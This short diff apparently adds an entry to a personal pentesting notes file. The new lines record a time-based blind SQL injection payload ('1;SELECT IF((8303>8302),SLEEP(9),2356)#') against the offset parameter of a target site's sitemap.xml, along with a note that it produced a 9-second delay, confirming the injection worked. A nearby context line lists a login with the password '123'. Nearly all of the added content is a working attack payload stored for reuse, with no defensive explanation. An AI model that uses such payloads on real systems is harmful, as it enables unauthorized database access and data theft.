@@ -384,6 +384,13 @@ login
 "Passwd":"123"
 
 
+sitemap xml 
+target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
+sleep payload 
+[1;SELECT IF((8303>8302),SLEEP(9),2356)#] = 9s
+
+
+
 
 
 ----------------------------------------------------------------------------------------------
